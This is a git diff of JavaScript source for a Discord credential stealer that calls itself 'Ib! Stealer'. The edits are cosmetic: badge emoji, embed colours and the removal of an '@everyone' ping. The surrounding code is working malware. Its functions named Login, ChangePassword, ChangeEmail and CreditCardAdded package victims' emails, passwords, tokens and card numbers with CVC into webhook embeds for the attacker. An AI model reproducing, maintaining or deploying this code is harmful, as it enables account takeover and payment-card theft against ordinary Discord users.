@@ -95,34 +95,34 @@ function GetBadges(flags) {
 	const Early_Verified_Bot_Developer = 131072;
 	var badges = "";
 	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "Discord Staff, "
+		badges += "<:staff:957186942565490708>  "
 	}
 	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "Partnered Server Owner, "
+		badges += "<:partner:957186932645957703>  "
 	}
 	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "Hypesquad Event, "
+		badges += "<:hse:957186922919391272>  "
 	}
 	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "Green Bughunter, "
+		badges += "<:BugHunter:957186882045898813>  "
 	}
 	if ((flags & House_Bravery) == House_Bravery) {
-		badges += "Hypesquad Bravery, "
+		badges += "<:Bravery:957186902480535562>  "
 	}
 	if ((flags & House_Brilliance) == House_Brilliance) {
-		badges += "HypeSquad Brillance, "
+		badges += "<:Brilliance:957186912806912040>  "
 	}
 	if ((flags & House_Balance) == House_Balance) {
-		badges += "HypeSquad Balance, "
+		badges += "<:Balance:957186892254830622>  "
 	}
 	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "Early Supporter, "
+		badges += "<:early:957186995061407774>  "
 	}
 	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "Gold BugHunter, "
+		badges += "<:BugHunterGold:957186872029884487>  "
 	}
 	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "Discord Developer, "
+		badges += "<:dev:957186962660405298>  "
 	}
 	if (badges == "") {
 		badges = "None"
@@ -145,7 +145,7 @@ function Login(email, password, token) {
             avatar_url: "https://imgur.com/jdtbBGR",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 050505,
                     "fields": [
                         {
                             "name": "<:ib:957045850121596998> **Account Info**",
@@ -187,7 +187,7 @@ function ChangePassword(oldpassword, newpassword, token) {
             avatar_url: "https://imgur.com/jdtbBGR",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 050505,
                     "fields": [
                         {
                             "name": "<:ib:957045850121596998> **Password Changed**",
@@ -234,7 +234,7 @@ function ChangeEmail(newemail, password, token) {
             avatar_url: "https://imgur.com/jdtbBGR",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 050505,
                     "fields": [
                         {
                             "name": "<a:ib:957044670498758746> **Email Changed**",
@@ -277,11 +277,11 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         var json = JSON.parse(info);
         var params = {
             username: "Ib! Stealer",
-            content: "@everyone",
+            content: "",
             avatar_url: "https://imgur.com/jdtbBGR",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 050505,
                     "fields": [
                         {
                             "name": "<:ib:957045933437251674> **Credit Card Added**",
